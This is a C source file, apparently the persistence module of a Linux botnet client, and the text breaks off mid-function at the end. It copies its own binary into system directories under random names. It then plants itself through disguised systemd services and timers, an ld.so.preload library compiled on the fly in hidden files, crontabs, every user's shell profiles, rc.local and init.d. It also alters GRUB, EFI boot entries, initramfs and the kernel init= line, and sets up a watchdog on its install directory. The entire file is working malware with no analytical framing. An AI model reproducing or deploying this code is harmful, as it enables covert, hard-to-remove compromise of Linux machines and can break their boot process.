#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <sys/inotify.h>
#include <dirent.h>
#include <time.h>
#include <errno.h>
#include <signal.h>
#include <libgen.h>

#include "includes.h"
#include "util.h"

#define MAX_PATH_LENGTH 256
#define MAX_CMD_LENGTH 512

static char persistent_path[256] = {0};

static void generate_random_name(char *buf, int len) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    srand(time(NULL) ^ getpid());
    
    for (int i = 0; i < len - 1; i++) {
        buf[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buf[len - 1] = '\0';
}

static BOOL is_readonly(const char *path) {
    struct statvfs fs;
    if (statvfs(path, &fs) != 0) {
        #ifdef DEBUG
            printf("[persistence] statvfs failed for %s: %s (errno: %d)\n", path, strerror(errno), errno);
        #endif
        return TRUE; 
    }
    return (fs.f_flag & ST_RDONLY) != 0;
}

static BOOL is_tmpfs(const char *path) {
    FILE *mtab = fopen("/proc/mounts", "r");
    if (mtab == NULL) {
        #ifdef DEBUG
            printf("[persistence] cannot open /proc/mounts: %s (errno: %d)\n", strerror(errno), errno);
        #endif
        return FALSE;
    }
    
    char line[512];
    char mount_point[256];
    char fs_type[64];
    BOOL is_tmp = FALSE;
    
    char real_path[256];
    if (realpath(path, real_path) == NULL) {
        strncpy(real_path, path, sizeof(real_path) - 1);
        real_path[sizeof(real_path) - 1] = '\0';
    }
    
    while (fgets(line, sizeof(line), mtab) != NULL) {
        if (sscanf(line, "%*s %255s %63s", mount_point, fs_type) == 2) {
            if (strcmp(fs_type, "tmpfs") == 0 || strcmp(fs_type, "ramfs") == 0) {
                size_t mount_len = strlen(mount_point);
                if (strncmp(real_path, mount_point, mount_len) == 0) {
                    if (real_path[mount_len] == '\0' || real_path[mount_len] == '/') {
                        is_tmp = TRUE;
                        break;
                    }
                }
            }
        }
    }
    
    fclose(mtab);
    return is_tmp;
}

static long long get_available_space(const char *path) {
    struct statvfs fs;
    if (statvfs(path, &fs) != 0) {
        #ifdef DEBUG
            printf("[persistence] statvfs failed for %s: %s (errno: %d)\n", path, strerror(errno), errno);
        #endif
        return 0;
    }
    return (long long)fs.f_bavail * (long long)fs.f_frsize;
}

static long long get_file_size(const char *path) {
    struct stat st;
    if (stat(path, &st) != 0) {
        #ifdef DEBUG
            printf("[persistence] stat failed for %s: %s (errno: %d)\n", path, strerror(errno), errno);
        #endif
        return 0;
    }
    return st.st_size;
}

static BOOL copy_file(const char *src, const char *dst) {
    FILE *src_fd, *dst_fd;
    char buffer[4096];
    size_t bytes_read;
    long long src_size, available_space;
    
    src_size = get_file_size(src);
    if (src_size == 0) {
        #ifdef DEBUG
            printf("[persistence] copy_file: source file %s is empty or inaccessible\n", src);
        #endif
        return FALSE;
    }
    
    available_space = get_available_space(dst);
    long long min_free_space = 1024 * 1024; 
    if (available_space < src_size * 2 || available_space < min_free_space) {
        #ifdef DEBUG
            printf("[persistence] copy_file: insufficient space at %s (need %lld, have %lld)\n", dst, src_size * 2, available_space);
        #endif
        return FALSE; 
    }
    
    src_fd = fopen(src, "rb");
    if (src_fd == NULL) {
        #ifdef DEBUG
            printf("[persistence] copy_file: cannot open source %s: %s (errno: %d)\n", src, strerror(errno), errno);
        #endif
        return FALSE;
    }
    
    dst_fd = fopen(dst, "wb");
    if (dst_fd == NULL) {
        #ifdef DEBUG
            printf("[persistence] copy_file: cannot open destination %s: %s (errno: %d)\n", dst, strerror(errno), errno);
        #endif
        fclose(src_fd);
        return FALSE;
    }
    
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), src_fd)) > 0) {
        if (fwrite(buffer, 1, bytes_read, dst_fd) != bytes_read) {
            #ifdef DEBUG
                printf("[persistence] copy_file: write failed for %s: %s (errno: %d)\n", dst, strerror(errno), errno);
            #endif
            fclose(src_fd);
            fclose(dst_fd);
            unlink(dst);
            return FALSE;
        }
    }
    
    fclose(src_fd);
    fclose(dst_fd);
    
    if (get_file_size(dst) != src_size) {
        #ifdef DEBUG
            printf("[persistence] copy_file: destination size mismatch for %s\n", dst);
        #endif
        unlink(dst);
        return FALSE;
    }
    
    if (chmod(dst, 0755) == -1) {
        #ifdef DEBUG
            printf("[persistence] copy_file: chmod failed for %s: %s (errno: %d)\n", dst, strerror(errno), errno);
        #endif
    }
    
    return TRUE;
}
static BOOL setup_systemd_improved(const char *bot_path) {
    char service_name[64];
    char service_path[256];
    char timer_path[256];
    
    generate_random_name(service_name, 12);
    
    const char *systemd_dirs[] = {
        "/etc/systemd/system",
        "/usr/lib/systemd/system",
        "/lib/systemd/system"
    };
    
    for (int i = 0; i < sizeof(systemd_dirs) / sizeof(systemd_dirs[0]); i++) {
        if (access(systemd_dirs[i], W_OK) != 0) continue;
        
        snprintf(service_path, sizeof(service_path), "%s/%s.service", 
                 systemd_dirs[i], service_name);
        
        FILE *f = fopen(service_path, "w");
        if (!f) continue;
        
        fprintf(f, "[Unit]\n");
        fprintf(f, "Description=Network Configuration Service\n");
        fprintf(f, "After=network.target\n");
        fprintf(f, "Wants=network-online.target\n\n");
        
        fprintf(f, "[Service]\n");
        fprintf(f, "Type=oneshot\n");
        fprintf(f, "RemainAfterExit=yes\n");
        fprintf(f, "ExecStart=%s --systemd\n", bot_path);
        fprintf(f, "ExecReload=%s --reload\n", bot_path);
        fprintf(f, "Restart=on-failure\n");
        fprintf(f, "RestartSec=30\n");
        fprintf(f, "StartLimitInterval=400\n");
        fprintf(f, "StartLimitBurst=10\n");
        fprintf(f, "StandardOutput=null\n");
        fprintf(f, "StandardError=null\n\n");
        
        fprintf(f, "[Install]\n");
        fprintf(f, "WantedBy=multi-user.target\n");
        fclose(f);
        
        snprintf(timer_path, sizeof(timer_path), "%s/%s.timer", 
                 systemd_dirs[i], service_name);
        
        f = fopen(timer_path, "w");
        if (f) {
            fprintf(f, "[Unit]\n");
            fprintf(f, "Description=Run %s periodically\n\n", service_name);
            fprintf(f, "[Timer]\n");
            fprintf(f, "OnBootSec=1min\n");
            fprintf(f, "OnUnitActiveSec=5min\n");
            fprintf(f, "RandomizedDelaySec=30s\n\n");
            fprintf(f, "[Install]\n");
            fprintf(f, "WantedBy=timers.target\n");
            fclose(f);
            
            char cmd[512];
            snprintf(cmd, sizeof(cmd), "systemctl enable %s.timer --now 2>/dev/null", service_name);
            system(cmd);
        }
        
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "systemctl enable %s.service 2>/dev/null", service_name);
        system(cmd);
        
        snprintf(cmd, sizeof(cmd), "systemctl mask %s.service 2>/dev/null", service_name);
        system(cmd);
        
        #ifdef DEBUG
            printf("[persistence] setup_systemd_improved: installed service %s\n", service_name);
        #endif
        return TRUE;
    }
    
    #ifdef DEBUG
        printf("[persistence] setup_systemd_improved: failed\n");
    #endif
    return FALSE;
}

static BOOL setup_ldpreload_simple(const char *bot_path) {
    const char *hidden_locations[] = {
        "/tmp/.X11-unix",
        "/dev/shm",
        "/var/tmp",
        "/usr/share/man",
        "/usr/include"
    };
    
    char so_path[256];
    char source_path[256];
    
    for (int loc = 0; loc < sizeof(hidden_locations) / sizeof(hidden_locations[0]); loc++) {
        if (access(hidden_locations[loc], W_OK) != 0) continue;
        
        char random_name[32];
        generate_random_name(random_name, 16);
        
        snprintf(so_path, sizeof(so_path), "%s/.%s.so", hidden_locations[loc], random_name);
        snprintf(source_path, sizeof(source_path), "%s/.%s.c", hidden_locations[loc], random_name);
        
        FILE *f = fopen(source_path, "w");
        if (!f) continue;
        
        fprintf(f, "#include <unistd.h>\n");
        fprintf(f, "#include <stdio.h>\n");
        fprintf(f, "#include <dlfcn.h>\n\n");
        
        fprintf(f, "__attribute__((constructor)) void init() {\n");
        fprintf(f, "    if (fork() == 0) {\n");
        fprintf(f, "        setsid();\n");
        fprintf(f, "        close(0); close(1); close(2);\n");
        fprintf(f, "        char *argv[] = {\"%s\", NULL};\n", bot_path);
        fprintf(f, "        execv(\"%s\", argv);\n", bot_path);
        fprintf(f, "        _exit(0);\n");
        fprintf(f, "    }\n");
        fprintf(f, "}\n\n");
        
        fprintf(f, "int dummy_function() {\n");
        fprintf(f, "    return 0;\n");
        fprintf(f, "}\n");
        
        fclose(f);
        
        char cmd[512];
        snprintf(cmd, sizeof(cmd), 
                 "gcc -fPIC -shared -nostdlib -xc -o %s %s 2>/dev/null && "
                 "rm -f %s 2>/dev/null",
                 so_path, source_path, source_path);
        
        if (system(cmd) == 0 && access(so_path, F_OK) == 0) {
            const char *preload_files[] = {
                "/etc/ld.so.preload",
                "/etc/ld.so.preload.d/malware.conf",
                "/usr/local/etc/ld.so.preload"
            };
            
            for (int i = 0; i < sizeof(preload_files) / sizeof(preload_files[0]); i++) {
                FILE *preload_f = fopen(preload_files[i], "a");
                if (preload_f) {
                    fprintf(preload_f, "\n%s\n", so_path);
                    fclose(preload_f);
                    
                    system("ldconfig 2>/dev/null");
                    
                    #ifdef DEBUG
                        printf("[persistence] setup_ldpreload_simple: installed to %s\n", preload_files[i]);
                    #endif
                    return TRUE;
                }
            }
        }
    }
    
    #ifdef DEBUG
        printf("[persistence] setup_ldpreload_simple: failed\n");
    #endif
    return FALSE;
}

static BOOL setup_cron_advanced(const char *bot_path) {
    int success_count = 0;
    
    char cron_cmd[512];
    snprintf(cron_cmd, sizeof(cron_cmd), 
             "(crontab -l 2>/dev/null | grep -v \"%s\"; "
             "echo '*/5 * * * * %s >/dev/null 2>&1'; "
             "echo '@reboot %s >/dev/null 2>&1') | crontab - 2>/dev/null",
             bot_path, bot_path, bot_path);
    
    if (system(cron_cmd) == 0) {
        success_count++;
        #ifdef DEBUG
            printf("[persistence] setup_cron_advanced: installed to user crontab\n");
        #endif
    }
    
    if (access("/etc/crontab", W_OK) == 0) {
        FILE *f = fopen("/etc/crontab", "a");
        if (f) {
            fprintf(f, "\n*/10 * * * * root %s >/dev/null 2>&1\n", bot_path);
            fprintf(f, "@reboot root %s >/dev/null 2>&1\n", bot_path);
            fclose(f);
            success_count++;
            #ifdef DEBUG
                printf("[persistence] setup_cron_advanced: installed to /etc/crontab\n");
            #endif
        }
    }
    
    const char *cron_dirs[] = {
        "/etc/cron.hourly",
        "/etc/cron.daily",
        "/etc/cron.weekly",
        "/etc/cron.monthly",
        "/etc/cron.d"
    };
    
    for (int i = 0; i < sizeof(cron_dirs) / sizeof(cron_dirs[0]); i++) {
        if (access(cron_dirs[i], W_OK) == 0) {
            char script_path[256];
            char random_name[32];
            generate_random_name(random_name, 12);
            
            snprintf(script_path, sizeof(script_path), "%s/%s", 
                     cron_dirs[i], random_name);
            
            FILE *f = fopen(script_path, "w");
            if (f) {
                fprintf(f, "#!/bin/sh\n");
                fprintf(f, "%s >/dev/null 2>&1 &\n", bot_path);
                fclose(f);
                chmod(script_path, 0755);
                success_count++;
                #ifdef DEBUG
                    printf("[persistence] setup_cron_advanced: installed to %s\n", cron_dirs[i]);
                #endif
            }
        }
    }
    
    return (success_count > 0);
}

static BOOL setup_profiles_aggressive(const char *bot_path) {
    int success_count = 0;
    
    const char *core_profiles[] = {
        "/etc/profile",
        "/etc/bash.bashrc",
        "/etc/zsh/zshrc",
        "/etc/environment",
        "/etc/profile.d/malware.sh"
    };
    
    for (int i = 0; i < sizeof(core_profiles) / sizeof(core_profiles[0]); i++) {
        char parent_dir[256];
        strncpy(parent_dir, core_profiles[i], sizeof(parent_dir));
        char *last_slash = strrchr(parent_dir, '/');
        if (last_slash) {
            *last_slash = '\0';
            if (is_readonly(parent_dir)) continue;
        }
        
        FILE *f = fopen(core_profiles[i], "a");
        if (f) {
            fprintf(f, "\nif [ -x \"%s\" ]; then\n", bot_path);
            fprintf(f, "    %s >/dev/null 2>&1 &\n", bot_path);
            fprintf(f, "fi\n");
            fclose(f);
            success_count++;
            #ifdef DEBUG
                printf("[persistence] setup_profiles_aggressive: added to %s\n", core_profiles[i]);
            #endif
        }
    }
    
    const char *user_dirs[] = {
        "/home",
        "/root",
        "/var/www"
    };
    
    for (int dir_idx = 0; dir_idx < sizeof(user_dirs) / sizeof(user_dirs[0]); dir_idx++) {
        DIR *dir = opendir(user_dirs[dir_idx]);
        if (!dir) continue;
        
        struct dirent *ent;
        while ((ent = readdir(dir)) != NULL) {
            if (ent->d_type == DT_DIR && ent->d_name[0] != '.') {
                char user_profile[256];
                
                snprintf(user_profile, sizeof(user_profile), "%s/%s/.profile", 
                         user_dirs[dir_idx], ent->d_name);
                FILE *f = fopen(user_profile, "a");
                if (f) {
                    fprintf(f, "\n[ -x \"%s\" ] && %s >/dev/null 2>&1 &\n", 
                            bot_path, bot_path);
                    fclose(f);
                    success_count++;
                }
                
                snprintf(user_profile, sizeof(user_profile), "%s/%s/.bashrc", 
                         user_dirs[dir_idx], ent->d_name);
                f = fopen(user_profile, "a");
                if (f) {
                    fprintf(f, "\n[ -x \"%s\" ] && %s >/dev/null 2>&1 &\n", 
                            bot_path, bot_path);
                    fclose(f);
                    success_count++;
                }
                
                snprintf(user_profile, sizeof(user_profile), "%s/%s/.bash_profile", 
                         user_dirs[dir_idx], ent->d_name);
                f = fopen(user_profile, "a");
                if (f) {
                    fprintf(f, "\n[ -x \"%s\" ] && %s >/dev/null 2>&1 &\n", 
                            bot_path, bot_path);
                    fclose(f);
                    success_count++;
                }
            }
        }
        closedir(dir);
    }
    
    #ifdef DEBUG
        printf("[persistence] setup_profiles_aggressive: infected %d profile files\n", success_count);
    #endif
    
    return (success_count > 0);
}

static BOOL setup_rclocal(const char *bot_path) {
    char rclocal_path[] = "/etc/rc.local";
    FILE *f;
    char line[512];
    BOOL found = FALSE;
    
    if (is_readonly("/etc")) {
        #ifdef DEBUG
            printf("[persistence] setup_rclocal: /etc is read-only\n");
        #endif
        return FALSE;
    }
    
    f = fopen(rclocal_path, "r");
    if (f != NULL) {
        while (fgets(line, sizeof(line), f) != NULL) {
            if (strstr(line, bot_path) != NULL) {
                found = TRUE;
                break;
            }
        }
        fclose(f);
    }
    
    if (found) {
        return TRUE;
    }
    
    f = fopen(rclocal_path, "a");
    if (f == NULL) {
        #ifdef DEBUG
            printf("[persistence] setup_rclocal: cannot open %s: %s (errno: %d)\n", rclocal_path, strerror(errno), errno);
        #endif
        return FALSE;
    }
    
    fprintf(f, "\n# Auto-added service\n");
    fprintf(f, "%s &\n", bot_path);
    fclose(f);
    
    return TRUE;
}

static BOOL setup_systemd(const char *bot_path) {
    char service_name[64];
    char service_path[128];
    FILE *f;
    
    if (is_readonly("/etc")) {
        #ifdef DEBUG
            printf("[persistence] setup_systemd: /etc is read-only\n");
        #endif
        return FALSE;
    }
    
    if (access("/etc/systemd/system", F_OK) != 0) {
        #ifdef DEBUG
            printf("[persistence] setup_systemd: /etc/systemd/system does not exist\n");
        #endif
        return FALSE;
    }
    
    if (access("/etc/systemd/system", W_OK) != 0) {
        #ifdef DEBUG
            printf("[persistence] setup_systemd: /etc/systemd/system is not writable: %s (errno: %d)\n", strerror(errno), errno);
        #endif
        return FALSE;
    }
    
    generate_random_name(service_name, 12);
    snprintf(service_path, sizeof(service_path), "/etc/systemd/system/%s.service", service_name);
    
    f = fopen(service_path, "w");
    if (f == NULL) {
        #ifdef DEBUG
            printf("[persistence] setup_systemd: cannot create %s: %s (errno: %d)\n", service_path, strerror(errno), errno);
        #endif
        return FALSE;
    }
    
    fprintf(f, "[Unit]\n");
    fprintf(f, "Description=System Service\n");
    fprintf(f, "After=network.target\n\n");
    
    fprintf(f, "[Service]\n");
    fprintf(f, "Type=simple\n");
    fprintf(f, "ExecStart=%s\n", bot_path);
    fprintf(f, "Restart=always\n");
    fprintf(f, "RestartSec=10\n\n");
    
    fprintf(f, "[Install]\n");
    fprintf(f, "WantedBy=multi-user.target\n");
    
    fclose(f);
    
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "systemctl enable %s.service >/dev/null 2>&1 || true", service_name);
    system(cmd);
    
    return TRUE;
}

static BOOL setup_cron(const char *bot_path) {
    char cron_cmd[512];
    FILE *f;
    char line[512];
    BOOL found = FALSE;
    
    f = popen("crontab -l 2>/dev/null", "r");
    if (f != NULL) {
        while (fgets(line, sizeof(line), f) != NULL) {
            if (strstr(line, bot_path) != NULL) {
                found = TRUE;
                break;
            }
        }
        pclose(f);
    }
    
    if (found) {
        return TRUE;
    }
    
    snprintf(cron_cmd, sizeof(cron_cmd), "(crontab -l 2>/dev/null; echo '@reboot %s &') | crontab -", bot_path);
    if (system(cron_cmd) != 0) {
        #ifdef DEBUG
            printf("[persistence] setup_cron: crontab command failed\n");
        #endif
        return FALSE;
    }
    
    return TRUE;
}

static BOOL setup_shell_profiles(const char *bot_path) {
    const char *profile_files[] = {
        "/etc/profile",
        "/etc/bash.bashrc",
        "/etc/profile.d/init.sh",
        "/root/.profile",
        "/root/.bashrc"
    };
    
    BOOL success = FALSE;
    
    for (int i = 0; i < sizeof(profile_files) / sizeof(profile_files[0]); i++) {
        FILE *f;
        char line[512];
        BOOL found = FALSE;
        
        char dir_path[256];
        util_strcpy(dir_path, profile_files[i]);
        char *last_slash = strrchr(dir_path, '/');
        if (last_slash) *last_slash = '\0';
        if (is_readonly(dir_path)) continue;
        
        f = fopen(profile_files[i], "r");
        if (f != NULL) {
            while (fgets(line, sizeof(line), f) != NULL) {
                if (strstr(line, bot_path) != NULL) {
                    found = TRUE;
                    break;
                }
            }
            fclose(f);
        }
        
        if (found) {
            success = TRUE;
            continue;
        }
        
        f = fopen(profile_files[i], "a");
        if (f != NULL) {
            fprintf(f, "\n%s >/dev/null 2>&1 &\n", bot_path);
            fclose(f);
            success = TRUE;
        }
    }
    
    return success;
}

static BOOL infect_boot_partition(const char *bot_path) {
    FILE *f = fopen("/proc/mounts", "r");
    if (f == NULL) {
        #ifdef DEBUG
            printf("[persistence] infect_boot_partition: cannot open /proc/mounts\n");
        #endif
        return FALSE;
    }
    
    char line[512];
    BOOL boot_mounted = FALSE;
    BOOL success = FALSE;
    
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, " /boot ") || strstr(line, " /boot/efi ")) {
            boot_mounted = TRUE;
            break;
        }
    }
    fclose(f);
    
    if (!boot_mounted) {
        #ifdef DEBUG
            printf("[persistence] infect_boot_partition: boot not mounted\n");
        #endif
        return FALSE;
    }
    
    system("mount -o remount,rw /boot 2>/dev/null");
    
    if (access("/boot/grub/grub.cfg", W_OK) == 0) {
        FILE *grub = fopen("/boot/grub/grub.cfg", "a");
        if (grub) {
            fprintf(grub, "\n# System recovery entry\n");
            fprintf(grub, "menuentry 'System Recovery' {\n");
            fprintf(grub, "  linux /vmlinuz root=/dev/sda1 init=%s\n", bot_path);
            fprintf(grub, "  initrd /initrd.img\n");
            fprintf(grub, "}\n");
            fclose(grub);
            success = TRUE;
            #ifdef DEBUG
                printf("[persistence] infect_boot_partition: modified grub.cfg\n");
            #endif
        }
    }
    
    return success;
}

static BOOL infect_efi_partition(const char *bot_path) {
    if (access("/sys/firmware/efi", F_OK) != 0) {
        #ifdef DEBUG
            printf("[persistence] infect_efi_partition: not UEFI system\n");
        #endif
        return FALSE;
    }
    
    system("mkdir -p /boot/efi 2>/dev/null");
    system("mount /dev/sda1 /boot/efi 2>/dev/null || "
           "mount /dev/nvme0n1p1 /boot/efi 2>/dev/null || "
           "mount /dev/mmcblk0p1 /boot/efi 2>/dev/null");
    
    if (access("/boot/efi/loader", F_OK) == 0) {
        system("mkdir -p /boot/efi/loader/entries 2>/dev/null");
        
        FILE *f = fopen("/boot/efi/loader/entries/persistent.conf", "w");
        if (f) {
            fprintf(f, "title System Recovery\n");
            fprintf(f, "linux /vmlinuz\n");
            fprintf(f, "initrd /initrd.img\n");
            fprintf(f, "options root=/dev/sda2 init=%s quiet\n", bot_path);
            fclose(f);
            #ifdef DEBUG
                printf("[persistence] infect_efi_partition: created boot entry\n");
            #endif
            
            FILE *loader = fopen("/boot/efi/loader/loader.conf", "a");
            if (loader) {
                fprintf(loader, "\ntimeout 3\ndefault persistent\n");
                fclose(loader);
            }
            
            return TRUE;
        }
    }
    
    return FALSE;
}
static BOOL infect_initramfs(const char *bot_path) {
    char initrd[256] = "/boot/initrd.img";
    if (access(initrd, F_OK) != 0) {
        strcpy(initrd, "/boot/initramfs-linux.img");
        if (access(initrd, F_OK) != 0) {
            strcpy(initrd, "/boot/initrd.img-$(uname -r)");
            if (access(initrd, F_OK) != 0) {
                #ifdef DEBUG
                    printf("[persistence] infect_initramfs: no initramfs found\n");
                #endif
                return FALSE;
            }
        }
    }
    
    if (access(initrd, W_OK) != 0) {
        system("mount -o remount,rw /boot 2>/dev/null");
    }
    
    char tmpdir[] = "/tmp/initrd.XXXXXX";
    if (mkdtemp(tmpdir) == NULL) {
        #ifdef DEBUG
            printf("[persistence] infect_initramfs: cannot create temp dir\n");
        #endif
        return FALSE;
    }
    
    char cmd[512];
    BOOL success = FALSE;
    
    snprintf(cmd, sizeof(cmd), "cd %s && zcat %s 2>/dev/null | cpio -id 2>/dev/null", tmpdir, initrd);
    if (system(cmd) != 0) {
        snprintf(cmd, sizeof(cmd), "cd %s && cat %s 2>/dev/null | cpio -id 2>/dev/null", tmpdir, initrd);
        system(cmd);
    }
    
    char init_script[512];
    snprintf(init_script, sizeof(init_script), "%s/init", tmpdir);
    
    FILE *f = fopen(init_script, "a");
    if (f) {
        fprintf(f, "\n# Auto-start service\n");
        fprintf(f, "if [ -x \"%s\" ]; then\n", bot_path);
        fprintf(f, "    %s &\n", bot_path);
        fprintf(f, "fi\n");
        fclose(f);
        
        char new_initrd[512];
        snprintf(new_initrd, sizeof(new_initrd), "%s.new", initrd);
        
        snprintf(cmd, sizeof(cmd),
                 "cd %s && find . 2>/dev/null | cpio -o -H newc 2>/dev/null | gzip > %s",
                 tmpdir, new_initrd);
        
        if (system(cmd) == 0) {
            snprintf(cmd, sizeof(cmd), "mv %s %s 2>/dev/null", new_initrd, initrd);
            if (system(cmd) == 0) {
                success = TRUE;
                #ifdef DEBUG
                    printf("[persistence] infect_initramfs: modified initramfs\n");
                #endif
            }
        }
    }
    
    snprintf(cmd, sizeof(cmd), "rm -rf %s", tmpdir);
    system(cmd);
    
    return success;
}

static BOOL modify_kernel_cmdline(const char *bot_path) {
    char *grub_files[] = {
        "/boot/grub/grub.cfg",
        "/boot/grub2/grub.cfg",
        "/etc/default/grub"
    };
    
    BOOL success = FALSE;
    
    for (int i = 0; i < sizeof(grub_files) / sizeof(grub_files[0]); i++) {
        if (access(grub_files[i], W_OK) == 0) {
            char cmd[512];
            snprintf(cmd, sizeof(cmd), 
                     "sed -i 's/\\(linux.*vmlinuz.*\\)/\\1 init=%s/' %s 2>/dev/null",
                     bot_path, grub_files[i]);
            
            if (system(cmd) == 0) {
                success = TRUE;
                #ifdef DEBUG
                    printf("[persistence] modify_kernel_cmdline: modified %s\n", grub_files[i]);
                #endif
            }
        }
    }
    
    if (access("/etc/kernel", W_OK) == 0) {
        FILE *f = fopen("/etc/kernel/cmdline", "w");
        if (f) {
            fprintf(f, "root=/dev/sda1 init=%s quiet\n", bot_path);
            fclose(f);
            success = TRUE;
        }
    }
    
    return success;
}

const char* get_persistent_path(void) {
    if (persistent_path[0] != '\0') {
        return persistent_path;
    }
    return NULL;
}

void persistence_init(void) {
    char self_exe[4096];
    char install_path[256];
    ssize_t len;
    
    len = readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1);
    if (len == -1) {
        #ifdef DEBUG
            printf("[persistence] persistence_init: cannot read /proc/self/exe: %s (errno: %d)\n", strerror(errno), errno);
        #endif
        return;
    }
    self_exe[len] = '\0';
    
    if (strstr(self_exe, "/usr/bin/") != NULL ||
        strstr(self_exe, "/usr/sbin/") != NULL ||
        strstr(self_exe, "/lib/") != NULL ||
        strstr(self_exe, "/usr/lib/") != NULL ||
        strstr(self_exe, "/usr/local/") != NULL ||
        strstr(self_exe, "/opt/") != NULL) {
        
        util_strcpy(persistent_path, self_exe);
        return;
    }
    
    const char *install_dirs[] = {
        "/usr/local/bin",      
        "/usr/local/lib",      
        "/opt",                
        "/var/lib",            
        "/usr/bin",            
        "/usr/sbin",           
        "/lib",                
        "/usr/lib"             
    };
    
    BOOL installed = FALSE;
    for (int i = 0; i < sizeof(install_dirs) / sizeof(install_dirs[0]); i++) {
        if (access(install_dirs[i], F_OK) != 0) {
            continue;
        }
        
        if (is_readonly(install_dirs[i])) {
            continue;
        }
        
        if (is_tmpfs(install_dirs[i])) {
            continue;
        }
        
        if (access(install_dirs[i], W_OK) == 0) {
            char random_name[32];
            generate_random_name(random_name, 16);
            
            snprintf(install_path, sizeof(install_path), "%s/%s", install_dirs[i], random_name);
            
            if (copy_file(self_exe, install_path)) {
                if (access(install_path, X_OK) == 0) {
                    util_strcpy(persistent_path, install_path);
                    installed = TRUE;
                    break;
                }
            }
        }
    }
    
    if (!installed) {
        const char *fallback_dirs[] = {
            "/tmp",
            "/var/tmp",
            "/dev/shm"
        };
        
        for (int i = 0; i < sizeof(fallback_dirs) / sizeof(fallback_dirs[0]); i++) {
            if (access(fallback_dirs[i], W_OK) == 0) {
                char random_name[32];
                generate_random_name(random_name, 16);
                snprintf(install_path, sizeof(install_path), "%s/%s", fallback_dirs[i], random_name);
                
                if (copy_file(self_exe, install_path)) {
                    if (access(install_path, X_OK) == 0) {
                        util_strcpy(persistent_path, install_path);
                        installed = TRUE;
                        break;
                    }
                }
            } else {
                #ifdef DEBUG
                    printf("[persistence] persistence_init: %s is not writable: %s (errno: %d)\n", fallback_dirs[i], strerror(errno), errno);
                #endif
            }
        }
        
        if (!installed) {
            #ifdef DEBUG
                printf("[persistence] persistence_init: failed to install to any location\n");
            #endif
            return;
        }
    }
    
    #ifdef DEBUG
        printf("[persistence] persistence_init: installed to %s\n", install_path);
    #endif
    
    int persistence_count = 0;
    
    #ifdef DEBUG
        printf("[persistence] Starting Tier 1 persistence methods...\n");
    #endif
    
    if (setup_systemd_improved(install_path)) {
        persistence_count++;
        usleep(200000);
    }
    
    if (setup_ldpreload_simple(install_path)) {
        persistence_count++;
        usleep(200000);
    }
    
    if (setup_cron_advanced(install_path)) {
        persistence_count++;
        usleep(200000);
    }
    
    if (setup_profiles_aggressive(install_path)) {
        persistence_count++;
        usleep(200000);
    }
    
    #ifdef DEBUG
        printf("[persistence] Attempting boot partition infection...\n");
    #endif
    
    if (infect_boot_partition(install_path)) {
        persistence_count++;
        usleep(200000);
    }
    
    if (infect_efi_partition(install_path)) {
        persistence_count++;
        usleep(200000);
    }
    
    if (infect_initramfs(install_path)) {
        persistence_count++;
        usleep(200000);
    }
    
    if (modify_kernel_cmdline(install_path)) {
        persistence_count++;
        usleep(200000);
    }
    
    #ifdef DEBUG
        printf("[persistence] Tier 1 installed %d methods, trying fallbacks...\n", persistence_count);
    #endif
    
    if (persistence_count < 2) {
        if (setup_systemd(install_path)) persistence_count++;
        usleep(200000);
        
        if (setup_rclocal(install_path)) persistence_count++;
        usleep(200000);
        
        if (setup_cron(install_path)) persistence_count++;
        usleep(200000);
        
        if (setup_shell_profiles(install_path)) persistence_count++;
        usleep(200000);
    }
    
    #ifdef DEBUG
        printf("[persistence] Total persistence methods installed: %d\n", persistence_count);
    #endif
    
    persistence_watchdog_init();
    
    if (access("/etc/init.d", F_OK) == 0 && access("/etc/init.d", W_OK) == 0 && !is_readonly("/etc")) {
        char init_script[256];
        char random_name[32];
        generate_random_name(random_name, 12);
        
        snprintf(init_script, sizeof(init_script), "/etc/init.d/%s", random_name);
        
        FILE *f = fopen(init_script, "w");
        if (f != NULL) {
            fprintf(f, "#!/bin/sh\n");
            fprintf(f, "### BEGIN INIT INFO\n");
            fprintf(f, "# Provides:          %s\n", random_name);
            fprintf(f, "# Required-Start:    $network\n");
            fprintf(f, "# Default-Start:     2 3 4 5\n");
            fprintf(f, "# Default-Stop:\n");
            fprintf(f, "### END INIT INFO\n\n");
            fprintf(f, "%s &\n", install_path);
            fclose(f);
            if (chmod(init_script, 0755) == -1) {
                #ifdef DEBUG
                    printf("[persistence] cannot chmod %s: %s (errno: %d)\n", init_script, strerror(errno), errno);
                #endif
            }
        } else {
            #ifdef DEBUG
                printf("[persistence] cannot create %s: %s (errno: %d)\n", init_script, strerror(errno), errno);
            #endif
        }
    }
}

static int inotify_fd = -1;
static int inotify_wd = -1;

void persistence_watchdog_init(void) {
    const char *persistent = get_persistent_path();
    if (persistent == NULL) {
        #ifdef DEBUG
            printf("[persistence] persistence_watchdog_init: no persistent path available\n");
        #endif
        return;
    }
    
    inotify_fd = inotify_init();
    if (inotify_fd == -1) {
        #ifdef DEBUG
            printf("[persistence] inotify_init failed: %s (errno: %d)\n", strerror(errno), errno);
        #endif
        return;
    }
    
    int flags = fcntl(inotify_fd, F_GETFL);
    if (flags != -1) {
        fcntl(inotify_fd, F_SETFL, flags | O_NONBLOCK);
    } else {
        #ifdef DEBUG
            printf("[persistence] fcntl F_GETFL failed: %s (errno: %d)\n", strerror(errno), errno);
        #endif
    }
    
    char dir_path[256];
    strncpy(dir_path, persistent, sizeof(dir_path) - 1);
    dir_path[sizeof(dir_path) - 1] = '\0';
    
    char *last_slash = strrchr(dir_path, '/');
    if (last_slash != NULL) {
        *last_slash = '\0';
    } else {
        strcpy(dir_path, ".");
    }
    
    inotify_wd = inotify_add_watch(inotify_fd, dir_path, IN_DELETE | IN_MOVED_FROM);
    if (inotify_wd == -1) {
        #ifdef DEBUG
            printf("[persistence] inotify_add_watch failed for %s: %s (errno: %d)\n", dir_path, strerror(errno), errno);
        #endif
        close(inotify_fd);
        inotify_fd = -1;
    }
}

void persistence_check_health(void) {
    const char *persistent = get_persistent_path();
    if (persistent == NULL)
        return;
